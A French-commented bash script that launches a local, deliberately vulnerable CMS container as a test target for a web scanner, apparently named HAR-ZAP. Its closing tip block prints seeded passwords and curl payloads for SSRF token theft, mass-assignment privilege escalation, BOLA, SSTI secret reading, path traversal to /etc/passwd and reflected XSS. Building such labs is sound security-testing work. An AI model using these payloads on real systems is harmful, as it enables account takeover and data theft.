#!/usr/bin/env bash
# CMS — fausse appli de contenu DÉLIBÉRÉMENT VULNÉRABLE (locale).
# Construit l'image légère examples/targets/cms/ et la lance. Mode adversarial
# pour HAR-ZAP : BOLA, mass assignment, SSRF (rebond interne), JWT alg=none,
# business-flow, shadow — plus des angles morts DAST (path traversal, SSTI, XSS,
# open redirect, reset prédictible, CORS, CSV). Voir examples/targets/cms/README.md.
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"; source "$HERE/lib.sh"
NAME=${NAME:-cms}; PORT=${PORT:-5005}
need_docker
log "Build image CMS (python-alpine, stdlib pur)"
docker build -q -t harzap-cms "$HERE/cms" >/dev/null
log "Démarrage CMS"
docker rm -f "$NAME" >/dev/null 2>&1 || true
docker run -d --name "$NAME" -p "127.0.0.1:${PORT}:5000" harzap-cms >/dev/null
on_cleanup "docker rm -f $NAME >/dev/null 2>&1"
wait_http "http://localhost:${PORT}/" '^200$' 20 1 || exit 1
curl -sS -m5 -X POST "http://localhost:${PORT}/createdb" >/dev/null && info "  base peuplée (/createdb)"
BASE="http://localhost:${PORT}"
log "Prêt"
info "Base URL : $BASE"
cat <<TIP

Comptes seedés : alice/alice123 (author) · bob/bob123 (author) · carol/carol123 (editor) · admin/admin123
Scénarios (voir README) :
  A. SSRF -> interne -> admin :
     TOK=\$(curl -s $BASE/auth/login -d '{"username":"alice","password":"alice123"}' -H 'Content-Type: application/json' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
     SVC=\$(curl -s $BASE/media/fetch -H "Authorization: Bearer \$TOK" -H 'Content-Type: application/json' -d '{"url":"http://localhost:5000/internal/metadata"}' | python3 -c 'import sys,json;print(json.loads(json.load(sys.stdin)["body"])["service_token"])')
     curl -s $BASE/admin/users -H "X-Service-Token: \$SVC"
  B. Mass assignment -> escalade :   curl -s -X PATCH $BASE/me -H "Authorization: Bearer \$TOK" -H 'Content-Type: application/json' -d '{"role":"admin"}'
  C. BOLA -> clé API -> takeover :    curl -s $BASE/users/4 -H "Authorization: Bearer \$TOK"   # fuite AK-admin-999
  E. Reset prédictible -> takeover :  curl -s $BASE/auth/reset-request -d '{"username":"admin"}' -H 'Content-Type: application/json'
  F. SSTI -> secret :                 curl -s -X POST $BASE/preview -H 'Content-Type: application/json' -d '{"template":"{config[secret_key]}"}'
  G. Path traversal (LFI) :           curl -s "$BASE/media/raw?path=../../etc/passwd"
  H. Business-flow (publier) :        curl -s -X POST $BASE/articles/2/publish -H "Authorization: Bearer \$TOK"
  I. XSS réfléchi :                   curl -s "$BASE/search?q=<script>alert(1)</script>"
  J. Shadow/debug :                   curl -s $BASE/debug/config ; curl -s $BASE/actuator/env
TIP
[ "${KEEP:-0}" = "1" ] || read -rp $'\nEntrée pour arrêter... ' _ || true
